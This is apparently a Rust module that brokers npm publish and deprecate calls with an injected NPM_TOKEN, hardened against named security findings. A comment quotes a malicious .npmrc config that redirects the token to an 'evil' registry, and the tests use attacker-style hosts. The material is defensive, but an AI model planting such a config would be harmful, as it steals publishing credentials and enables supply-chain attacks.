//! `kvendra.npm` — npm registry broker (IF-KVD-CLI-003).
//!
//! Operations: `publish`, `deprecate`, `read_metadata`. The `npm` CLI
//! reads its registry token from the `NPM_TOKEN` env var (or via
//! `--//registry.npmjs.org/:_authToken=...` config), so the broker
//! injects the plaintext as `NPM_TOKEN` in the child process env. The
//! plaintext is wrapped in `SecretPlaintext` (ZeroizeOnDrop) and lives
//! only for the duration of the subprocess.

use crate::error::{KvendraError, KvendraResult};
use crate::vault::SecretPlaintext;
use serde_json::{Value, json};
use tokio::process::Command;

/// The only registry the broker will publish to / authenticate against.
pub const NPMJS_REGISTRY: &str = "https://registry.npmjs.org/";

/// Build the argv for `npm publish`.
///
/// ISSUE-KVD-CLI-B78ED5 finding **N6** — pin `--registry` on the CLI. npm reads
/// its config with the precedence `CLI flag > env > project .npmrc (cwd) > user
/// .npmrc`. `publish` runs in the caller-controlled `cwd`, so without a pinned
/// registry a planted `cwd/.npmrc` (`registry=http://evil/` plus
/// `//evil/:_authToken=${NPM_TOKEN}`) redirects the publish AND exfiltrates the
/// injected `NPM_TOKEN` to an attacker registry. A CLI `--registry` is highest
/// precedence, so it overrides the cwd `.npmrc`: the target host is always
/// npmjs.org and the token can only ever go there.
///
/// `--ignore-scripts` is finding **N2** (lifecycle-script RCE from the cwd).
fn publish_argv(access: &str) -> Vec<String> {
    vec![
        "publish".into(),
        "--ignore-scripts".into(),
        "--registry".into(),
        NPMJS_REGISTRY.into(),
        "--access".into(),
        access.into(),
    ]
}

/// Build the argv for `npm deprecate`. Registry pinned (N6) for the same reason;
/// `--` terminates option parsing before the caller-controlled positionals.
fn deprecate_argv(package: &str, message: &str) -> Vec<String> {
    vec![
        "deprecate".into(),
        "--ignore-scripts".into(),
        "--registry".into(),
        NPMJS_REGISTRY.into(),
        "--".into(),
        package.into(),
        message.into(),
    ]
}

pub async fn execute(args: &Value, secret: Option<&SecretPlaintext>) -> KvendraResult<Value> {
    let operation = args
        .get("operation")
        .and_then(Value::as_str)
        .ok_or_else(|| KvendraError::InvalidArgs("operation missing".into()))?;
    let op_args = args.get("args").cloned().unwrap_or(Value::Null);

    match operation {
        "publish" => publish(&op_args, secret).await,
        "deprecate" => deprecate(&op_args, secret).await,
        "read_metadata" => read_metadata(&op_args).await,
        other => Err(KvendraError::InvalidArgs(format!(
            "unsupported npm operation '{other}'"
        ))),
    }
}

async fn publish(op_args: &Value, secret: Option<&SecretPlaintext>) -> KvendraResult<Value> {
    let cwd = op_args.get("cwd").and_then(Value::as_str).ok_or_else(|| {
        KvendraError::InvalidArgs("npm.publish.cwd required (path of package)".into())
    })?;
    let access = op_args
        .get("access")
        .and_then(Value::as_str)
        .unwrap_or("restricted");

    // N6 continued — `--registry` sets only the DEFAULT registry. For a SCOPED
    // package npm's `pickRegistry` uses the scope-specific `@scope:registry`
    // (from the cwd `.npmrc` or `package.json`), which overrides the default and
    // would still send `NPM_TOKEN` to an attacker registry; and
    // `publishConfig.registry` in package.json can redirect the publish outright.
    // Read the caller-controlled package.json: pin the package's OWN scope to
    // npmjs on the CLI (highest precedence), and refuse a publishConfig.registry
    // that points off npmjs.
    let mut scope_pin: Option<String> = None;
    if let Ok(raw) = std::fs::read_to_string(std::path::Path::new(cwd).join("package.json"))
        && let Ok(pkg) = serde_json::from_str::<Value>(&raw)
    {
        if let Some(scope) = pkg
            .get("name")
            .and_then(Value::as_str)
            .and_then(|n| n.strip_prefix('@'))
            .and_then(|r| r.split_once('/'))
            .map(|(s, _)| s)
        {
            scope_pin = Some(format!("--@{scope}:registry={NPMJS_REGISTRY}"));
        }
        if let Some(reg) = pkg
            .get("publishConfig")
            .and_then(|p| p.get("registry"))
            .and_then(Value::as_str)
            && !registry_is_npmjs(reg)
        {
            return Err(KvendraError::AllowlistViolation(format!(
                "npm.publish: package.json publishConfig.registry '{reg}' is not the npmjs \
                 registry — refusing (it would redirect the publish and the token)"
            )));
        }
    }

    // Hardened spawn: scrub KVENDRA_* env (N1) + sanitised PATH (A2).
    let mut cmd = crate::primitives::spawn::hardened_command("npm");
    // N2 (--ignore-scripts) + N6 (--registry pinned) — see `publish_argv`.
    cmd.args(publish_argv(access));
    if let Some(pin) = &scope_pin {
        cmd.arg(pin);
    }
    cmd.current_dir(cwd);
    if let Some(s) = secret {
        cmd.env("NPM_TOKEN", s.as_str()?);
    }
    run_npm("publish", cmd).await
}

/// Is `registry` the public npmjs registry (host `registry.npmjs.org`)?
fn registry_is_npmjs(registry: &str) -> bool {
    registry
        .trim()
        .trim_end_matches('/')
        .strip_prefix("https://")
        .or_else(|| {
            registry
                .trim()
                .trim_end_matches('/')
                .strip_prefix("http://")
        })
        .map(|host_path| {
            let host = host_path.split('/').next().unwrap_or(host_path);
            host.eq_ignore_ascii_case("registry.npmjs.org")
        })
        .unwrap_or(false)
}

async fn deprecate(op_args: &Value, secret: Option<&SecretPlaintext>) -> KvendraResult<Value> {
    let package = op_args
        .get("package")
        .and_then(Value::as_str)
        .ok_or_else(|| KvendraError::InvalidArgs("npm.deprecate.package required".into()))?;
    // N5 — a package spec beginning with `-` is an option-injection vector.
    crate::primitives::spawn::reject_option_like("npm.deprecate.package", package)?;
    let message = op_args.get("message").and_then(Value::as_str).unwrap_or("");
    let mut cmd = crate::primitives::spawn::hardened_command("npm");
    cmd.args(deprecate_argv(package, message));
    if let Some(s) = secret {
        cmd.env("NPM_TOKEN", s.as_str()?);
    }
    run_npm("deprecate", cmd).await
}

async fn read_metadata(op_args: &Value) -> KvendraResult<Value> {
    // Public read — no token required.
    let package = op_args
        .get("package")
        .and_then(Value::as_str)
        .ok_or_else(|| KvendraError::InvalidArgs("npm.read_metadata.package required".into()))?;
    let url = format!("https://registry.npmjs.org/{package}");
    let client = reqwest::Client::builder()
        .user_agent(concat!("kvendra/", env!("CARGO_PKG_VERSION")))
        .build()?;
    let resp = client.get(&url).send().await?;
    let status = resp.status();
    let body: Value = resp.json().await.unwrap_or(Value::Null);
    Ok(json!({
        "operation": "read_metadata",
        "status_code": status.as_u16(),
        "package": package,
        "metadata": body,
    }))
}

async fn run_npm(operation: &str, mut cmd: Command) -> KvendraResult<Value> {
    let output = cmd
        .output()
        .await
        .map_err(|_| KvendraError::PrimitiveFailed {
            primitive: "kvendra.npm".into(),
            operation: operation.into(),
        })?;
    Ok(json!({
        "operation": operation,
        "exit_code": output.status.code().unwrap_or_default(),
        "success": output.status.success(),
        "stdout_sanitized": sanitize(&output.stdout),
        "stderr_sanitized": sanitize(&output.stderr),
    }))
}

fn sanitize(bytes: &[u8]) -> String {
    crate::detection::sanitize_output(&String::from_utf8_lossy(bytes))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// N6 — the publish argv must pin `--registry` to npmjs.org so a
    /// caller-controlled `cwd/.npmrc` cannot redirect the publish (or the
    /// injected NPM_TOKEN) to an attacker registry. N2 — scripts disabled.
    #[test]
    fn publish_argv_pins_registry_and_disables_scripts() {
        let argv = publish_argv("public");
        let i = argv
            .iter()
            .position(|a| a == "--registry")
            .expect("N6: --registry must be pinned on publish");
        assert_eq!(
            argv[i + 1],
            NPMJS_REGISTRY,
            "registry must be pinned to npmjs.org"
        );
        assert!(
            argv.iter().any(|a| a == "--ignore-scripts"),
            "N2: --ignore-scripts must be present"
        );
    }

    #[test]
    fn registry_is_npmjs_only_for_npmjs_host() {
        assert!(registry_is_npmjs("https://registry.npmjs.org/"));
        assert!(registry_is_npmjs("https://registry.npmjs.org"));
        assert!(registry_is_npmjs("http://registry.npmjs.org/"));
        // Attacker redirects must NOT be accepted.
        assert!(!registry_is_npmjs("https://evil.example/"));
        assert!(!registry_is_npmjs(
            "https://registry.npmjs.org.evil.example/"
        ));
        assert!(!registry_is_npmjs("https://npm.pkg.github.com/"));
        assert!(!registry_is_npmjs("registry.npmjs.org")); // no scheme
    }

    /// N6 — deprecate also authenticates, so it must pin the registry too, and
    /// the `--` terminator must still precede the caller-controlled positionals.
    #[test]
    fn deprecate_argv_pins_registry_before_terminator() {
        let argv = deprecate_argv("pkg@1.0.0", "deprecated");
        let reg = argv
            .iter()
            .position(|a| a == "--registry")
            .expect("N6: --registry must be pinned on deprecate");
        assert_eq!(argv[reg + 1], NPMJS_REGISTRY);
        let dd = argv
            .iter()
            .position(|a| a == "--")
            .expect("-- terminator present");
        // The registry flag is an option, so it must come before the `--`.
        assert!(reg < dd, "--registry must precede the -- terminator");
        // The package (a positional) must come after `--`.
        assert_eq!(argv[dd + 1], "pkg@1.0.0");
    }
}
